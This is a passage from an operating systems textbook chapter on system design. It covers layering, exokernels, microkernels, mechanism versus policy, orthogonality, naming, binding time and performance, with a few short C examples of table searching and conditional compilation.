In layer 4 we might find the device drivers, each one running as a separate thread, with its own state, program counter, registers, and so on, possibly (but not necessarily) within the kernel address space. Such a design can greatly simplify the I/O structure because when an interrupt occurs, it can be converted into an unlock on a mutex and a call to the scheduler to (potentially) schedule the newly readied thread that was blocked on the mutex. MINIX 3 uses this approach, but in UNIX, Linux, and Windows 8, the interrupt handlers run in a kind of no-man's land, rather than as proper threads like other threads that can be scheduled, suspended, and the like. Since a huge amount of the complexity of any operating system is in the I/O, any technique for making it more tractable and encapsulated is worth considering.

Above layer 4, we would expect to find virtual memory, one or more file systems, and the system-call handlers. These layers are focused on providing services to applications. If the virtual memory is at a lower level than the file systems, then the block cache can be paged out, allowing the virtual memory manager to dynamically determine how the real memory should be divided among user pages and kernel pages, including the cache. Windows 8 works this way.

## Exokernels

While layering has its supporters among system designers, another camp has precisely the opposite view (Engler et al., 1995). Their view is based on the endto-end argument (Saltzer et al., 1984). This concept says that if something has to be done by the user program itself, it is wasteful to do it in a lower layer as well.

Consider an application of that principle to remote file access. If a system is worried about data being corrupted in transit, it should arrange for each file to be checksummed at the time it is written and the checksum stored along with the file. When a file is transferred over a network from the source disk to the destination process, the checksum is transferred, too, and also recomputed at the receiving end. If the two disagree, the file is discarded and transferred again.

This check is more accurate than using a reliable network protocol since it also catches disk errors, memory errors, software errors in the routers, and other errors besides bit transmission errors. The end-to-end argument says that using a reliable network protocol is then not necessary, since the endpoint (the receiving process) has enough information to verify the correctness of the file. The only reason for using a reliable network protocol in this view is for efficiency, that is, catching and repairing transmission errors earlier.

The end-to-end argument can be extended to almost all of the operating system. It argues for not having the operating system do anything that the user program can do itself. For example, why have a file system? Just let the user read and write a portion of the raw disk in a protected way. Of course, most users like having files, but the end-to-end argument says that the file system should be a library procedure linked with any program that needs to use files. This approach allows different programs to have different file systems. This line of reasoning says that all the operating system should do is securely allocate resources (e.g., the CPU and the disks) among the competing users. The Exokernel is an operating system built according to the end-to-end argument (Engler et al., 1995).

## Microkernel-Based Client-Server Systems

A compromise between having the operating system do everything and the operating system do nothing is to have the operating system do a little bit. This design leads to a microkernel with much of the operating system running as userlevel server processes, as illustrated in Fig. 12-3. This is the most modular and flexible of all the designs. The ultimate in flexibility is to have each device driver also run as a user process, fully protected against the kernel and other drivers, but even having the device drivers run in the kernel adds to the modularity.

When the device drivers are in the kernel, they can access the hardware device registers directly. When they are not, some mechanism is needed to provide access to them. If the hardware permits, each driver process could be given access to only those I/O devices it needs. For example, with memory-mapped I/O, each driver

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-457_349_1278_241_128.jpg)
Figure 12-3. Client-server computing based on a microkernel.

process could have the page for its device mapped in, but no other device pages. If the I/O port space can be partially protected, the correct portion of it could be made available to each driver.

Even if no hardware assistance is available, the idea can still be made to work. What is then needed is a new system call, available only to device-driver processes, supplying a list of (port, value) pairs. What the kernel does is first check to see if the process owns all the ports in the list. If so, it then copies the corresponding values to the ports to initiate device I/O. A similar call can be used to read I/O ports.

This approach keeps device drivers from examining (and damaging) kernel data structures, which is (for the most part) a good thing. An analogous set of calls could be made available to allow driver processes to read and write kernel tables, but only in a controlled way and with the approval of the kernel.

The main problem with this approach, and with microkernels in general, is the performance hit all the extra context switches cause. However, virtually all work on microkernels was done many years ago when CPUs were much slower. Nowadays, applications that use every drop of CPU power and cannot tolerate a small loss of performance are few and far between. After all, when running a word processor or Web browser, the CPU is probably idle 95\% of the time. If a microkernelbased operating system turned an unreliable 3.5-GHz system into a reliable 3.0-GHz system, probably few users would complain. Or even notice. After all, most of them were quite happy only a few years ago when they got their previous computer at the then-stupendous speed of 1 GHz. Also, it is not clear whether the cost of interprocess communication is still as much of an issue if cores are no longer a scarce resource. If each device driver and each component of the operating system has its own dedicated core, there is no context switching during interprocess communication. In addition, the caches, branch predictors and TLBs will be all warmed up and ready to run at full speed. Some experimental work on a high-performance operating system based on a microkernel was presented by Hruby et al. (2013).

It is noteworthy that while microkernels are not popular on the desktop, they are very widely used in cell phones, industrial systems, embedded systems, and
military systems, where very high reliability is absolutely essential. Also, Apple's OS X, which runs on all Macs and Macbooks, consists of a modified version of FreeBSD running on top of a modified version of the Mach microkernel.

## Extensible Systems

With the client-server systems discussed above, the idea was to remove as much out of the kernel as possible. The opposite approach is to put more modules into the kernel, but in a protected way. The key word here is protected, of course. We studied some protection mechanisms in Sec. 9.5.6 that were initially intended for importing applets over the Internet, but are equally applicable to inserting foreign code into the kernel. The most important ones are sandboxing and code signing, as interpretation is not really practical for kernel code.

Of course, an extensible system by itself is not a way to structure an operating system. However, by starting with a minimal system consisting of little more than a protection mechanism and then adding protected modules to the kernel one at a time until reaching the functionality desired, a minimal system can be built for the application at hand. In this view, a new operating system can be tailored to each application by including only the parts it requires. Paramecium is an example of such a system (Van Doorn, 2001).

## Kernel Threads

Another issue relevant here no matter which structuring model is chosen is that of system threads. It is sometimes convenient to allow kernel threads to exist, separate from any user process. These threads can run in the background, writing dirty pages to disk, swapping processes between main memory and disk, and so forth. In fact, the kernel itself can be structured entirely of such threads, so that when a user does a system call, instead of the user's thread executing in kernel mode, the user's thread blocks and passes control to a kernel thread that takes over to do the work.

In addition to kernel threads running in the background, most operating systems start up many daemon processes in the background. While these are not part of the operating system, they often perform "system" type activities. These might including getting and sending email and serving various kinds of requests for remote users, such as FTP and Web pages.

### 12.3.2 Mechanism vs. Policy

Another principle that helps architectural coherence, along with keeping things small and well structured, is that of separating mechanism from policy. By putting the mechanism in the operating system and leaving the policy to user processes, the system itself can be left unmodified, even if there is a need to change policy.

Even if the policy module has to be kept in the kernel, it should be isolated from the mechanism, if possible, so that changes in the policy module do not affect the mechanism module.

To make the split between policy and mechanism clearer, let us consider two real-world examples. As a first example, consider a large company that has a payroll department, which is in charge of paying the employees' salaries. It has computers, software, blank checks, agreements with banks, and more mechanisms for actually paying out the salaries. However, the policy-determining who gets paid how much-is completely separate and is decided by management. The payroll department just does what it is told to do.

As the second example, consider a restaurant. It has the mechanism for serving diners, including tables, plates, waiters, a kitchen full of equipment, agreements with food suppliers and credit card companies, and so on. The policy is set by the chef, namely, what is on the menu. If the chef decides that tofu is out and big steaks are in, this new policy can be handled by the existing mechanism.

Now let us consider some operating system examples. First, let us consider thread scheduling. The kernel could have a priority scheduler, with $k$ priority levels. The mechanism is an array, indexed by priority level, as is the case in UNIX and Windows 8. Each entry is the head of a list of ready threads at that priority level. The scheduler just searches the array from highest priority to lowest priority, selecting the first threads it hits. The policy is setting the priorities. The system may have different classes of users, each with a different priority, for example. It might also allow user processes to set the relative priority of its threads. Priorities might be increased after completing I/O or decreased after using up a quantum. There are numerous other policies that could be followed, but the idea here is the separation between setting policy and carrying it out.

A second example is paging. The mechanism involves MMU management, keeping lists of occupied and free pages, and code for shuttling pages to and from disk. The policy is deciding what to do when a page fault occurs. It could be local or global, LRU-based or FIFO-based, or something else, but this algorithm can (and should) be completely separate from the mechanics of managing the pages.

A third example is allowing modules to be loaded into the kernel. The mechanism concerns how they are inserted, how they are linked, what calls they can make, and what calls can be made on them. The policy is determining who is allowed to load a module into the kernel and which modules. Maybe only the superuser can load modules, but maybe any user can load a module that has been digitally signed by the appropriate authority.

### 12.3.3 Orthogonality

Good system design consists of separate concepts that can be combined independently. For example, in C there are primitive data types including integers, characters, and floating-point numbers. There are also mechanisms for combining
data types, including arrays, structures, and unions. These ideas combine independently, allowing arrays of integers, arrays of characters, structures and union members that are floating-point numbers, and so forth. In fact, once a new data type has been defined, such as an array of integers, it can be used as if it were a primitive data type, for example as a member of a structure or a union. The ability to combine separate concepts independently is called orthogonality. It is a direct consequence of the simplicity and completeness principles.

The concept of orthogonality also occurs in operating systems in various disguises. One example is the Linux clone system call, which creates a new thread. The call has a bitmap as a parameter, which allows the address space, working directory, file descriptors, and signals to be shared or copied individually. If everything is copied, we have a new process, the same as fork. If nothing is copied, a new thread is created in the current process. However, it is also possible to create intermediate forms of sharing not possible in traditional UNIX systems. By separating out the various features and making them orthogonal, a finer degree of control is possible.

Another use of orthogonality is the separation of the process concept from the thread concept in Windows 8. A process is a container for resources, nothing more and nothing less. A thread is a schedulable entity. When one process is given a handle for another process, it does not matter how many threads it has. When a thread is scheduled, it does not matter which process it belongs to. These concepts are orthogonal.

Our last example of orthogonality comes from UNIX. Process creation there is done in two steps: fork plus exec. Creating the new address space and loading it with a new memory image are separate, allowing things to be done in between (such as manipulating file descriptors). In Windows 8, these two steps cannot be separated, that is, the concepts of making a new address space and filling it in are not orthogonal there. The Linux sequence of clone plus exec is yet more orthogonal, since even more fine-grained building blocks are available. As a general rule, having a small number of orthogonal elements that can be combined in many ways leads to a small, simple, and elegant system.

### 12.3.4 Naming

Most long-lived data structures used by an operating system have some kind of name or identifier by which they can be referred to. Obvious examples are login names, file names, device names, process IDs, and so on. How these names are constructed and managed is an important issue in system design and implementation.

Names that were primarily designed for human beings to use are character-string names in ASCII or Unicode and are usually hierarchical. Directory paths, such as /usr/ast/books/mos4/chap-12, are clearly hierarchical, indicating a series of directories to search starting at the root. URLs are also hierarchical. For example,
www.cs.vu.nl/~ast/ indicates a specific machine (www) in a specific department $(c s)$ at specific university $(v u)$ in a specific country $(n l)$. The part after the slash indicates a specific file on the designated machine, in this case, by convention, www/index.html in ast's home directory. Note that URLs (and DNS addresses in general, including email addresses) are "backward," starting at the bottom of the tree and going up, unlike file names, which start at the top of the tree and go down. Another way of looking at this is whether the tree is written from the top starting at the left and going right or starting at the right and going left.

Often naming is done at two levels: external and internal. For example, files always have a character-string name in ASCII or Unicode for people to use. In addition, there is almost always an internal name that the system uses. In UNIX, the real name of a file is its i-node number; the ASCII name is not used at all internally. In fact, it is not even unique, since a file may have multiple links to it. The analogous internal name in Windows 8 is the file's index in the MFT. The job of the directory is to provide the mapping between the external name and the internal name, as shown in Fig. 12-4.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-461_522_1230_944_153.jpg)
Figure 12-4. Directories are used to map external names onto internal names.

In many cases (such as the file-name example given above), the internal name is an unsigned integer that serves as an index into a kernel table. Other examples of table-index names are file descriptors in UNIX and object handles in Windows 8. Note that neither of these has any external representation. They are strictly for use by the system and running processes. In general, using table indices for transient names that are lost when the system is rebooted is a good idea.

Operating systems commonly support multiple namespaces, both external and internal. For example, in Chap. 11 we looked at three external namespaces supported by Windows 8: file names, object names, and registry names (and there is also the Active Directory namespace, which we did not look at). In addition, there are innumerable internal namespaces using unsigned integers, for example, object
handles and MFT entries. Although the names in the external namespaces are all Unicode strings, looking up a file name in the registry will not work, just as using an MFT index in the object table will not work. In a good design, considerable thought is given to how many namespaces are needed, what the syntax of names is in each one, how they can be told apart, whether absolute and relative names exist, and so on.

### 12.3.5 Binding Time

As we have just seen, operating systems use various kinds of names to refer to objects. Sometimes the mapping between a name and an object is fixed, but sometimes it is not. In the latter case, when the name is bound to the object may matter. In general, early binding is simple, but not flexible, whereas late binding is more complicated but often more flexible.

To clarify the concept of binding time, let us look at some real-world examples. An example of early binding is the practice of some colleges to allow parents to enroll a baby at birth and prepay the current tuition. When the student shows up 18 years later, the tuition is fully paid, no matter how high it may be at that moment.

In manufacturing, ordering parts in advance and maintaining an inventory of them is early binding. In contrast, just-in-time manufacturing requires suppliers to be able to provide parts on the spot, with no advance notice required. This is late binding.

Programming languages often support multiple binding times for variables. Global variables are bound to a particular virtual address by the compiler. This exemplifies early binding. Variables local to a procedure are assigned a virtual address (on the stack) at the time the procedure is invoked. This is intermediate binding. Variables stored on the heap (those allocated by malloc in C or new in Java) are assigned virtual addresses only at the time they are actually used. Here we have late binding.

Operating systems often use early binding for most data structures, but occasionally use late binding for flexibility. Memory allocation is a case in point. Early multiprogramming systems on machines lacking address-relocation hardware had to load a program at some memory address and relocate it to run there. If it was ever swapped out, it had to be brought back at the same memory address or it would fail. In contrast, paged virtual memory is a form of late binding. The actual physical address corresponding to a given virtual address is not known until the page is touched and actually brought into memory.

Another example of late binding is window placement in a GUI. In contrast to the early graphical systems, in which the programmer had to specify the absolute screen coordinates for all images on the screen, in modern GUIs the software uses coordinates relative to the window's origin, but that is not determined until the window is put on the screen, and it may even be changed later.

### 12.3.6 Static vs. Dynamic Structures

Operating system designers are constantly forced to choose between static and dynamic data structures. Static ones are always simpler to understand, easier to program, and faster in use; dynamic ones are more flexible. An obvious example is the process table. Early systems simply allocated a fixed array of per-process structures. If the process table consisted of 256 entries, then only 256 processes could exist at any one instant. An attempt to create a 257th one would fail for lack of table space. Similar considerations held for the table of open files (both per user and systemwide), and many other kernel tables.

An alternative strategy is to build the process table as a linked list of minitables, initially just one. If this table fills up, another one is allocated from a global storage pool and linked to the first one. In this way, the process table cannot fill up until all of kernel memory is exhausted.

On the other hand, the code for searching the table becomes more complicated. For example, the code for searching a static process table for a given PID, pid, is given in Fig. 12-5. It is simple and efficient. Doing the same thing for a linked list of minitables is more work.
```

found (=0);
for (p = &proc_table[0]; p < &proc_table[PROC_TABLE_SIZE]; p++) {
if (p->proc_pid == pid) {
found (=1);
break;
}
}

```

Figure 12-5. Code for searching the process table for a given PID.

Static tables are best when there is plenty of memory or table utilizations can be guessed fairly accurately. For example, in a single-user system, it is unlikely that the user will start up more than 128 processes at once, and it is not a total disaster if an attempt to start a 129th one fails.

Yet another alternative is to use a fixed-size table, but if it fills up, allocate a new fixed-size table, say, twice as big. The current entries are then copied over to the new table and the old table is returned to the free storage pool. In this way, the table is always contiguous rather than linked. The disadvantage here is that some storage management is needed and the address of the table is now a variable instead of a constant.

A similar issue holds for kernel stacks. When a thread switches from user mode to kernel mode, or a kernel-mode thread is run, it needs a stack in kernel space. For user threads, the stack can be initialized to run down from the top of the virtual address space, so the size need not be specified in advance. For kernel threads, the size must be specified in advance because the stack takes up some kernel virtual address space and there may be many stacks. The question is: how much
space should each one get? The trade-offs here are similar to those for the process table. Making key data structures like these dynamic is possible, but complicated.

Another static-dynamic trade-off is process scheduling. In some systems, especially real-time ones, the scheduling can be done statically in advance. For example, an airline knows what time its flights will leave weeks before their departure. Similarly, multimedia systems know when to schedule audio, video, and other processes in advance. For general-purpose use, these considerations do not hold and scheduling must be dynamic.

Yet another static-dynamic issue is kernel structure. It is much simpler if the kernel is built as a single binary program and loaded into memory to run. The consequence of this design, however, is that adding a new I/O device requires a relinking of the kernel with the new device driver. Early versions of UNIX worked this way, and it was quite satisfactory in a minicomputer environment when adding new I/O devices was a rare occurrence. Nowadays, most operating systems allow code to be added to the kernel dynamically, with all the additional complexity that entails.

### 12.3.7 Top-Down vs. Bottom-Up Implementation

While it is best to design the system top down, in theory it can be implemented top down or bottom up. In a top-down implementation, the implementers start with the system-call handlers and see what mechanisms and data structures are needed to support them. These procedures are written, and so on, until the hardware is reached.

The problem with this approach is that it is hard to test anything with only the top-level procedures available. For this reason, many developers find it more practical to actually build the system bottom up. This approach entails first writing code that hides the low-level hardware, essentially the HAL in Fig. 11-4. Interrupt handling and the clock driver are also needed early on.

Then multiprogramming can be tackled, along with a simple scheduler (e.g., round-robin scheduling). At this point it should be possible to test the system to see if it can run multiple processes correctly. If that works, it is now time to begin the careful definition of the various tables and data structures needed throughout the system, especially those for process and thread management and later memory management. I/O and the file system can wait initially, except for a primitive way to read the keyboard and write to the screen for testing and debugging. In some cases, the key low-level data structures should be protected by allowing access only through specific access procedures-in effect, object-oriented programming, no matter what the programming language is. As lower layers are completed, they can be tested thoroughly. In this way, the system advances from the bottom up, much the way contractors build tall office buildings.

If a large team of programmers is available, an alternative approach is to first make a detailed design of the whole system, and then assign different groups to
write different modules. Each one tests its own work in isolation. When all the pieces are ready, they are integrated and tested. The problem with this line of attack is that if nothing works initially, it may be hard to isolate whether one or more modules are malfunctioning, or one group misunderstood what some other module was supposed to do. Nevertheless, with large teams, this approach is often used to maximize the amount of parallelism in the programming effort.

### 12.3.8 Synchronous vs. Asynchronous Communication

Another issue that often creeps up in conversations between operating system designers is whether the interactions between the system components should be synchronous or asynchronous (and, related, whether threads are better than events). The issue frequently leads to heated arguments between proponents of the two camps, although it does not leave them foaming at the mouth quite as much as when deciding really important matters-like which is the best editor, vi or emacs. We use the term "synchronous" in the (loose) sense of Sec. 8.2 to denote calls that block until completion. Conversely, with "asynchronous" calls the caller keeps running. There are advantages and disadvantages to either model.

Some systems, like Amoeba, really embrace the synchronous design and implement communication between processes as blocking client-server calls. Fully synchronous communication is conceptually very simple. A process sends a request and blocks waiting until the reply arrives-what could be simpler? It becomes a little more complicated when there are many clients all crying for the server's attention. Each individual request may block for a long time waiting for other requests to complete first. This can be solved by making the server multi-threaded so that each thread can handle one client. The model is tried and tested in many real-world implementations, in operating systems as well as user applications.

Things get more complicated still if the threads frequently read and write shared data structures. In that case, locking is unavoidable. Unfortunately, getting the locks right is not easy. The simplest solution is to throw a single big lock on all shared data structures (similar to the big kernel lock). Whenever a thread wants to access the shared data structures, it has to grab the lock first. For performance reasons, a single big lock is a bad idea, because threads end up waiting for each other all the time even if they do not conflict at all. The other extreme, lots of micro locks for (parts) of individual data structures, is much faster, but conflicts with our guiding principle number one: simplicity.

Other operating systems build their interprocess communication using asynchronous primitives. In a way, asynchronous communication is even simpler than its synchronous cousin. A client process sends a message to a server, but rather than wait for the message to be delivered or a reply to be sent back, it just continues executing. Of course, this means that it also receives the reply asynchronously and should remember which request corresponded to it when it arrives. The server typically processes the requests (events) as a single thread in an event loop.

Whenever the request requires the server to contact other servers for further processing it sends an asynchronous message of its own and, rather than block, continues with the next request. Multiple threads are not needed. With only a single thread processing events, the problem of multiple threads accessing shared data structures cannot occur. On the other hand, a long-running event handler makes the single-threaded server's response sluggish.

Whether threads or events are the better programming model is a long-standing controversial issue that has stirred the hearts of zealots on either side ever since John Ousterhout's classic paper: "Why threads are a bad idea (for most purposes)" (1996). Ousterhout argues that threads make everything needlessly complicated: locking, debugging, callbacks, performance-you name it. Of course, it would not be a controversy if everybody agreed. A few years after Ousterhout's paper, Von Behren et al. (2003) published a paper titled "Why events are a bad idea (for highconcurrency servers)." Thus, deciding on the right programming model is a hard, but important decision for system designers. There is no slam-dunk winner. Web servers like apache firmly embrace synchronous communication and threads, but others like lighttpd are based on the event-driven paradigm. Both are very popular. In our opinion, events are often easier to understand and debug than threads. As long as there is no need for per-core concurrency, they are probably a good choice.

### 12.3.9 Useful Techniques

We have just looked at some abstract ideas for system design and implementation. Now we will examine a number of useful concrete techniques for system implementation. There are numerous others, of course, but space limitations restrict us to just a few.

## Hiding the Hardware

A lot of hardware is ugly. It has to be hidden early on (unless it exposes power, which most hardware does not). Some of the very low-level details can be hidden by a HAL-type layer of the type shown in Fig. 12-2 as layer 1. However, many hardware details cannot be hidden this way.

One thing that deserves early attention is how to deal with interrupts. They make programming unpleasant, but operating systems have to deal with them. One approach is to turn them into something else immediately. For example, every interrupt could be turned into a pop-up thread instantly. At that point we are dealing with threads, rather than interrupts.

A second approach is to convert each interrupt into an unlock operation on a mutex that the corresponding driver is waiting on. Then the only effect of an interrupt is to cause some thread to become ready.

A third approach is to immediately convert an interrupt into a message to some thread. The low-level code just builds a message telling where the interrupt came from, enqueues it, and calls the scheduler to (potentially) run the handler, which was probably blocked waiting for the message. All these techniques, and others like them, all try to convert interrupts into thread-synchronization operations. Having each interrupt handled by a proper thread in a proper context is easier to manage than running a handler in the arbitrary context that it happened to occur in. Of course, this must be done efficiently, but deep within the operating system, everything must be done efficiently.

Most operating systems are designed to run on multiple hardware platforms. These platforms can differ in terms of the CPU chip, MMU, word length, RAM size, and other features that cannot easily be masked by the HAL or equivalent. Nevertheless, it is highly desirable to have a single set of source files that are used to generate all versions; otherwise each bug that later turns up must be fixed multiple times in multiple sources, with the danger that the sources drift apart.

Some hardware differences, such as RAM size, can be dealt with by having the operating system determine the value at boot time and keep it in a variable. Memory allocators, for example, can use the RAM-size variable to determine how big to make the block cache, page tables, and the like. Even static tables such as the process table can be sized based on the total memory available.

However, other differences, such as different CPU chips, cannot be solved by having a single binary that determines at run time which CPU it is running on. One way to tackle the problem of one source and multiple targets is to use conditional compilation. In the source files, certain compile-time flags are defined for the different configurations and these are used to bracket code that is dependent on the CPU, word length, MMU, and so on. For example, imagine an operating system that is to run on the IA32 line of x86 chips (sometimes referred to as x86-32), or on UltraSPARC chips, which need different initialization code. The init procedure could be written as illustrated in Fig. 12-6(a). Depending on the value of CPU, which is defined in the header file config.h, one kind of initialization or other is done. Because the actual binary contains only the code needed for the target machine, there is no loss of efficiency this way.

As a second example, suppose there is a need for a data type Register, which should be 32 bits on the IA32 and 64 bits on the UltraSPARC. This could be handled by the conditional code of Fig. 12-6(b) (assuming that the compiler produces 32-bit ints and 64-bit longs). Once this definition has been made (probably in a header file included everywhere), the programmer can just declare variables to be of type Register and know they will be the right length.

The header file, config.h, has to be defined correctly, of course. For the IA32 it might be something like this:

[^1]```
#include "config.h" #include "config.h"
init() #if (WORD_LENGTH == 32)
{ typedef int Register;
#if (CPU == IA32) #endif
/* IA32 initialization here. */
#endif #if (WORD_LENGTH == 64)
    typedef long Register;
#endif
/* UltraSPARC initialization here. */
#endif Register R0, R1, R2, R3;
        (a) (b)
}
```

Figure 12-6. (a) CPU-dependent conditional compilation. (b) Word-length-de-pendent conditional compilation.
To compile the system for the UltraSPARC, a different config.h would be used, with the correct values for the UltraSPARC, probably something like

```
#define CPU ULTRASPARC
#define WORD_LENGTH 64
```

Some readers may be wondering why CPU and WORD_LENGTH are handled by different macros. We could easily have bracketed the definition of Register with a test on $C P U$, setting it to 32 bits for the IA32 and 64 bits for the Ultra-SPARC. However, this is not a good idea. Consider what happens when we later port the system to the 32-bit ARM. We would have to add a third conditional to Fig. 12-6(b) for the ARM. By doing it as we have, all we have to do is include the line

```
#define WORD_LENGTH 32
```

to the config.h file for the ARM.
This example illustrates the orthogonality principle we discussed earlier. Those items that are CPU dependent should be conditionally compiled based on the CPU macro, and those that are word-length dependent should use the WORD_LENGTH macro. Similar considerations hold for many other parameters.

## Indirection

It is sometimes said that there is no problem in computer science that cannot be solved with another level of indirection. While something of an exaggeration, there is definitely a grain of truth here. Let us consider some examples. On x86-based systems, when a key is depressed, the hardware generates an interrupt and puts the key number, rather than an ASCII character code, in a device register.

Furthermore, when the key is released later, a second interrupt is generated, also with the key number. This indirection allows the operating system the possibility of using the key number to index into a table to get the ASCII character, which makes it easy to handle the many keyboards used around the world in different countries. Getting both the depress and release information makes it possible to use any key as a shift key, since the operating system knows the exact sequence in which the keys were depressed and released.

Indirection is also used on output. Programs can write ASCII characters to the screen, but these are interpreted as indices into a table for the current output font. The table entry contains the bitmap for the character. This indirection makes it possible to separate characters from fonts.

Another example of indirection is the use of major device numbers in UNIX. Within the kernel there is a table indexed by major device number for the block devices and another one for the character devices. When a process opens a special file such as /dev/hd0, the system extracts the type (block or character) and major and minor device numbers from the i-node and indexes into the appropriate driver table to find the driver. This indirection makes it easy to reconfigure the system, because programs deal with symbolic device names, not actual driver names.

Yet another example of indirection occurs in message-passing systems that name a mailbox rather than a process as the message destination. By indirecting through mailboxes (as opposed to naming a process as the destination), considerable flexibility can be achieved (e.g., having a secretary handle her boss’ messages).

In a sense, the use of macros, such as
> #define PROC_TABLE_SIZE 256

is also a form of indirection, since the programmer can write code without having to know how big the table really is. It is good practice to give symbolic names to all constants (except sometimes -1, 0, and 1), and put these in headers with comments explaining what they are for.

## Reusability

It is frequently possible to reuse the same code in slightly different contexts. Doing so is a good idea as it reduces the size of the binary and means that the code has to be debugged only once. For example, suppose that bitmaps are used to keep track of free blocks on the disk. Disk-block management can be handled by having procedures alloc and free that manage the bitmaps.

As a bare minimum, these procedures should work for any disk. But we can go further than that. The same procedures can also work for managing memory blocks, blocks in the file system’s block cache, and i-nodes. In fact, they can be used to allocate and deallocate any resources that can be numbered linearly.

## Reentrancy

Reentrancy refers to the ability of code to be executed two or more times simultaneously. On a multiprocessor, there is always the danger than while one CPU is executing some procedure, another CPU will start executing it as well, before the first one has finished. In this case, two (or more) threads on different CPUs might be executing the same code at the same time. This situation must be protected against by using mutexes or some other means to protect critical regions.

However, the problem also exists on a uniprocessor. In particular, most of any operating system runs with interrupts enabled. To do otherwise would lose many interrupts and make the system unreliable. While the operating system is busy executing some procedure, $P$, it is entirely possible that an interrupt occurs and that the interrupt handler also calls $P$. If the data structures of $P$ were in an inconsistent state at the time of the interrupt, the handler will see them in an inconsistent state and fail.

An obvious example where this can happen is if $P$ is the scheduler. Suppose that some process has used up its quantum and the operating system is moving it to the end of its queue. Partway through the list manipulation, the interrupt occurs, makes some process ready, and runs the scheduler. With the queues in an inconsistent state, the system will probably crash. As a consequence even on a uniprocessor, it is best that most of the operating system is reentrant, critical data structures are protected by mutexes, and interrupts are disabled at moments when they cannot be tolerated.

## Brute Force

Using brute-force to solve a problem has acquired a bad name over the years, but it is often the way to go in the name of simplicity. Every operating system has many procedures that are rarely called or operate with so few data that optimizing them is not worthwhile. For example, it is frequently necessary to search various tables and arrays within the system. The brute force algorithm is to just leave the table in the order the entries are made and search it linearly when something has to be looked up. If the number of entries is small (say, under 1000), the gain from sorting the table or hashing it is small, but the code is far more complicated and more likely to have bugs in it. Sorting or hashing the mount table (which keeps track of mounted file systems in UNIX systems) really is not a good idea.

Of course, for functions that are on the critical path, say, context switching, everything should be done to make them very fast, possibly even writing them in (heaven forbid) assembly language. But large parts of the system are not on the critical path. For example, many system calls are rarely invoked. If there is one fork every second, and it takes 1 msec to carry out, then even optimizing it to 0 wins only 0.1%. If the optimized code is bigger and buggier, a case can be made not to bother with the optimization.

## Check for Errors First

Many system calls can fail for a variety of reasons: the file to be opened belongs to someone else; process creation fails because the process table is full; or a signal cannot be sent because the target process does not exist. The operating system must painstakingly check for every possible error before carrying out the call.

Many system calls also require acquiring resources such as process-table slots, i-node table slots, or file descriptors. A general piece of advice that can save a lot of grief is to first check to see if the system call can actually be carried out before acquiring any resources. This means putting all the tests at the beginning of the procedure that executes the system call. Each test should be of the form
if (error_condition) return(ERROR_CODE);
If the call gets all the way through the gamut of tests, then it is certain that it will succeed. At that point resources can be acquired.

Interspersing the tests with resource acquisition means that if some test fails along the way, all resources acquired up to that point must be returned. If an error is made here and some resource is not returned, no damage is done immediately. For example, one process-table entry may just become permanently unavailable. No big deal. However, over a period of time, this bug may be triggered multiple times. Eventually, most or all of the process-table entries may become unavailable, leading to a system crash in an extremely unpredictable and difficult-to-debug way.

Many systems suffer from this problem in the form of memory leaks. Typically, the program calls malloc to allocate space but forgets to call free later to release it. Ever so gradually, all of memory disappears until the system is rebooted.

Engler et al. (2000) have proposed a way to check for some of these errors at compile time. They observed that the programmer knows many invariants that the compiler does not know, such as when you lock a mutex, all paths starting at the lock must contain an unlock and no more locks of the same mutex. They have devised a way for the programmer to tell the compiler this fact and instruct it to check all the paths at compile time for violations of the invariant. The programmer can also specify that allocated memory must be released on all paths and many other conditions as well.

### 12.4 PERFORMANCE

All things being equal, a fast operating system is better than a slow one. However, a fast unreliable operating system is not as good as a reliable slow one. Since complex optimizations often lead to bugs, it is important to use them sparingly. This notwithstanding, there are places where performance is critical and optimizations are worth the effort. In the following sections, we will look at some techniques that can be used to improve performance in places where that is called for.

### 12.4.1 Why Are Operating Systems Slow?

Before talking about optimization techniques, it is worth pointing out that the slowness of many operating systems is to a large extent self-inflicted. For example, older operating systems, such as MS-DOS and UNIX Version 7, booted within a few seconds. Modern UNIX systems and Windows 8 can take several minutes to boot, despite running on hardware that is 1000 times faster. The reason is that they are doing much more, wanted or not. A case in point. Plug and play makes it somewhat easier to install a new hardware device, but the price paid is that on every boot, the operating system has to go out and inspect all the hardware to see if there is anything new out there. This bus scan takes time.

An alternative (and, in the authors’ opinion, better) approach would be to scrap plug-and-play altogether and have an icon on the screen labeled “Install new hardware.” Upon installing a new hardware device, the user would click on it to start the bus scan, instead of doing it on every boot. The designers of current systems were well aware of this option, of course. They rejected it, basically, because they assumed that the users were too stupid to be able to do this correctly (although they would word it more kindly). This is only one example, but there are many more where the desire to make the system “user-friendly” (or “idiot-proof,” depending on your linguistic preferences) slows the system down all the time for everyone.

Probably the biggest single thing system designers can do to improve performance is to be much more selective about adding new features. The question to ask is not whether some users like it, but whether it is worth the inevitable price in code size, speed, complexity, and reliability. Only if the advantages clearly outweigh the drawbacks should it be included. Programmers have a tendency to assume that code size and bug count will be 0 and speed will be infinite. Experience shows this view to be a wee bit optimistic.

Another factor that plays a role is product marketing. By the time version 4 or 5 of some product has hit the market, probably all the features that are actually useful have been included and most of the people who need the product already have it. To keep sales going, many manufacturers nevertheless continue to produce a steady stream of new versions, with more features, just so they can sell their existing customers upgrades. Adding new features just for the sake of adding new features may help sales but rarely helps performance.

### 12.4.2 What Should Be Optimized?

As a general rule, the first version of the system should be as straightforward as possible. The only optimizations should be things that are so obviously going to be a problem that they are unavoidable. Having a block cache for the file system is such an example. Once the system is up and running, careful measurements should be made to see where the time is really going. Based on these numbers, optimizations should be made where they will help most.

Here is a true story of where an optimization did more harm than good. One of the authors (AST) had a former student (who shall here remain nameless) who wrote the original MINIX $m k f s$ program. This program lays down a fresh file system on a newly formatted disk. The student spent about 6 months optimizing it, including putting in disk caching. When he turned it in, it did not work and it required several additional months of debugging. This program typically runs on the hard disk once during the life of the computer, when the system is installed. It also runs once for each disk that is formatted. Each run takes about 2 sec. Even if the unoptimized version had taken 1 minute, it was a poor use of resources to spend so much time optimizing a program that is used so infrequently.

A slogan that has considerable applicability to performance optimization is

## Good enough is good enough.

